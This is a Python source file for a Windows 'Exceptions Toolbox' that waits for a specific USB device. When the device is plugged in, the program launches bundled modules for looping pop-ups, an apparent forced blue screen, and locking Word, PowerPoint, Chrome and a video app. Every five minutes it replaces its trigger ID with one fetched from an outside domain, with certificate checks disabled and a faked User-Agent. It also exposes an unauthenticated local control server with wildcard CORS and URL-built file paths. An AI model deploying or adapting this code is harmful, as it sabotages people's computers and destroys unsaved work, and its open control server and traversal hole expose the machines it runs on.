#! -*- coding: utf-8 -*-
import _thread
import json
import os
import ssl
import sys
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

import pythoncom
import wmi as wmi

# Exceptions Toolbox
# By ArthurZhou


VER = '0.0.0'
TIME_FMT = "%Y-%m-%d %H:%M:%S"
INFO = {
    'version': VER,
    'status': 'OK',
}


def path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
        if relative_path == 'config.json':
            if not os.path.exists(os.path.join(os.getenv('LOCALAPPDATA'), 'exceptions')):
                os.mkdir(os.path.join(os.getenv('LOCALAPPDATA'), 'exceptions'))
            return os.path.join(os.getenv('LOCALAPPDATA'), 'exceptions', 'config.json')
    except:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


class Logger:
    @staticmethod
    def trace(logText):
        print(time.strftime(TIME_FMT, time.localtime()) + " [TRACE] " + str(logText))

    @staticmethod
    def debug(logText):
        print(time.strftime(TIME_FMT, time.localtime()) + " [DEBUG] " + str(logText))

    @staticmethod
    def info(logText):
        print(time.strftime(TIME_FMT, time.localtime()) + " [INFO] " + str(logText))

    @staticmethod
    def warn(logText):
        print(time.strftime(TIME_FMT, time.localtime()) + " [WARN] " + str(logText))

    @staticmethod
    def error(logText):
        print(time.strftime(TIME_FMT, time.localtime()) + " [ERROR] " + str(logText))

    @staticmethod
    def fatal(logText):
        print(time.strftime(TIME_FMT, time.localtime()) + " [FATAL] " + str(logText))


class ModuleControl:
    def __init__(self):
        pythoncom.CoInitialize()
        os.environ['USB_READY'] = 'false'
        while True:
            if ModuleControl.check():
                log.debug("USB device detected")
                os.environ['USB_READY'] = 'true'
                ModuleControl.execute()
                while True:
                    if not ModuleControl.check():
                        log.debug("USB device unplugged")
                        os.environ['USB_READY'] = 'false'
                        break
            time.sleep(1)

    @staticmethod
    def check():
        try:
            c = wmi.WMI()
            wql = "Select * From Win32_USBControllerDevice"
            for item in c.query(wql):
                if ','.join(item.Dependent.HardwareID) == os.environ['USB_ID']:
                    return True
            return False
        except Exception as e:
            log.error(e)
            pass

    @staticmethod
    def execute():
        if MODULES['popUper']['enable']:
            log.debug('Enabling popUper')
            _thread.start_new_thread(ModuleControl.popUper, ())
        if MODULES['bsod']['enable']:
            log.debug('Enabling bsod')
            _thread.start_new_thread(ModuleControl.bsod, ())
        if MODULES['autoLocker']['enable']:
            log.debug('Enabling autoLocker')
            _thread.start_new_thread(ModuleControl.autoLocker, ())

    @staticmethod
    def popUper():
        time.sleep(MODULES['popUper']['start_delay'])
        if MODULES['popUper']['loop']:
            while os.environ['USB_READY'] == 'true':
                os.system('powershell.exe ' + path('modules/popUper.exe'))
                time.sleep(MODULES['popUper']['delay'])
        else:
            os.system('powershell.exe ' + path('modules/popUper.exe'))

    @staticmethod
    def bsod():
        time.sleep(MODULES['bsod']['start_delay'])
        if MODULES['bsod']['loop']:
            while os.environ['USB_READY'] == 'true':
                os.system('powershell.exe ' + path('modules/bsod.exe'))
                time.sleep(MODULES['bsod']['delay'])
        else:
            os.system('powershell.exe ' + path('modules/bsod.exe'))

    @staticmethod
    def autoLocker():
        def execLocker(target):
            for t in target:
                os.system('powershell.exe ' + path('modules/autoLocker.exe') + ' ' + t)

        time.sleep(MODULES['autoLocker']['start_delay'])
        if MODULES['autoLocker']['loop']:
            while os.environ['USB_READY'] == 'true':
                execLocker(MODULES['autoLocker']['target'])
                time.sleep(MODULES['autoLocker']['delay'])
        else:
            execLocker(MODULES['autoLocker']['target'])


class RateCounter:
    def __init__(self):
        while True:
            startTime = time.time()
            currentLoop = 0
            while currentLoop < 1:
                time.sleep(0.9)
                currentLoop += 1
            analyze = time.time() - startTime
            if analyze <= 1:
                pass
            else:
                skipTime = str(int(analyze / 3600)) + "h-" + str(int(analyze / 60) % 60) + "m-" + \
                           str(round(analyze % 60, 2)) + "s"
                log.warn('Can`t keep up!Skip {0} ~= {1} seconds.'.format(analyze, skipTime))


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        url_path = self.path
        if url_path == '/':
            url_path = '/index.html'
        try:
            file_io = open(path('page' + url_path), 'r', encoding='utf-8')
            message = file_io.read()
            file_io.close()
            self.send_response(200)
        except FileNotFoundError:
            message = 'File not found'
            self.send_response(404)
        except PermissionError:
            message = 'Something unexpected happened on our end'
            self.send_response(500)
        self.end_headers()
        self.wfile.write(bytes(message, 'utf-8'))

    def do_POST(self):
        url_path = self.path
        if url_path == '/request/status':
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(bytes(json.dumps(INFO), 'utf-8'))
        elif url_path == '/request/functions':
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(bytes(json.dumps(INFO), 'utf-8'))
        elif url_path == '/request/settings':
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(bytes(json.dumps(cfg), 'utf-8'))
        elif url_path == '/request/sudo':
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(bytes(json.dumps(INFO), 'utf-8'))
        elif url_path == '/submit':
            self.send_header('Access-Control-Allow-Origin', '*')
            content_length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(content_length).decode('utf-8'))
            if data['type'] == 'settings':
                log.warn(f'{self.client_address} > Update settings')
                cfg['usb_id'] = data['content']['usb_id']
                cfg_file = open(path('config.json'), 'w')
                cfg_file.write(json.dumps(cfg))
                cfg_file.close()
                os.environ['USB_ID'] = data['content']['usb_id']
                response = bytes('OK', 'utf-8')
                self.send_response(200)
                self.send_header("Content-Length", str(response))
                self.end_headers()
                self.wfile.write(response)
            elif data['type'] == 'restart':
                log.warn(f'{self.client_address} > Restart requested')
                response = bytes('OK', 'utf-8')
                self.send_response(200)
                self.send_header("Content-Length", str(response))
                self.end_headers()
                self.wfile.write(response)
                if data['content']['confirm']:
                    log.warn(f'{self.client_address} > Restarting')
                    print('\n======\n\n\n')
                    os.execl(sys.executable, sys.executable, *sys.argv)
                else:
                    log.warn(f'{self.client_address} > Restart interrupted')
            elif data['type'] == 'shutdown':
                log.warn(f'{self.client_address} > Shutdown requested')
                response = bytes('OK', 'utf-8')
                self.send_response(200)
                self.send_header("Content-Length", str(response))
                self.end_headers()
                self.wfile.write(response)
                if data['content']['confirm']:
                    log.warn(f'{self.client_address} > Shutting down')
                    sys.exit(0)
                else:
                    log.warn(f'{self.client_address} > Shut down interrupted')
            else:
                response = bytes('Bad request', 'utf-8')
                self.send_response(400)
                self.send_header("Content-Length", str(response))
                self.end_headers()
                self.wfile.write(response)
        else:
            self.send_response(400)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(bytes('Bad request', 'utf-8'))

    def log_message(self, format_msg, *args):
        log.debug("%s > %s" %
                  (self.client_address[0],
                   format_msg % args))

    def log_error(self, format_err, *args):
        log.error("%s > %s" %
                  (self.client_address[0],
                   format_err % args))


class HttpServer:
    def __init__(self):
        log.info(f"Starting http server on {ADDR}")
        server = HTTPServer(ADDR, RequestHandler)
        server.serve_forever()


class Config:
    def __init__(self):
        global ADDR, MODULES
        os.environ['USB_ID'] = cfg['usb_id']
        ADDR = (cfg['addr'][0], cfg['addr'][1])
        MODULES = cfg['modules']

    @staticmethod
    def updateUsbId():
        while True:
            try:
                log.debug('Updating USB ID')
                ssl._create_default_https_context = ssl._create_unverified_context
                update = urllib.request.Request('https://exceptions.net.eu.org/usbid', headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0'})
                new_id = urllib.request.urlopen(update).read().decode('utf-8').replace('\n', '').replace(' ', '')
                log.debug('Update success')
                if new_id == os.environ['USB_ID']:
                    pass
                else:
                    log.info(f'Updating USB ID from {os.environ["USB_ID"]} to {new_id}')
                    os.environ['USB_ID'] = new_id
                    cfg['usb_id'] = new_id
                    cfg_file = open(path('config.json'), 'w')
                    cfg_file.write(json.dumps(cfg))
                    cfg_file.close()
            except Exception as e:
                log.warn('Failed to fetch USB ID')
                log.error(e)
                pass
            time.sleep(300)


def main():
    global cfg
    log.info(f"Starting Exceptions ver: {VER}  By ArthurZhou")
    log.debug("Reading config.json")
    if not os.path.exists(path('config.json')):
        cfg = {
            "addr": ["127.0.0.1", 11451], "usb_id": "USBSTOR\\\\DiskVendorCoProductCode_____2.00,USBSTOR\\\\DiskVendorCoProductCode_____,USBSTOR\\\\DiskVendorCo,USBSTOR\\\\VendorCoProductCode_____2,VendorCoProductCode_____2,USBSTOR\\\\GenDisk,GenDisk",
            "modules": {
                "popUper": {"enable": True, "loop": True, "delay": 30, "start_delay": 10},
                "bsod": {"enable": True, "loop": False, "delay": 0, "start_delay": 180},
                "autoLocker": {"enable": True, "loop": False, "delay": 0, "start_delay": 5,
                               "target": ["POWERPNT", "WINWORD", "Video.UI", "chrome"]}
            }
        }
        cfg_file = open(path('config.json'), 'w')
        cfg_file.write(json.dumps(cfg))
        cfg_file.close()
    else:
        cfg_file = open(path('config.json'), 'r')
        cfg = json.loads(cfg_file.read())
        cfg_file.close()
    Config()
    _thread.start_new_thread(ModuleControl, ())
    HttpServer()


if __name__ == '__main__':
    try:
        log = Logger
        _thread.start_new_thread(RateCounter, ())
        _thread.start_new_thread(Config.updateUsbId, ())
        main()
    except KeyboardInterrupt:
        Logger.warn('Exiting...')
        sys.exit(0)
    except Exception as err:
        Logger.fatal(err)
        Logger.fatal("Exited due to unrecoverable fatal!")
        sys.exit(0)
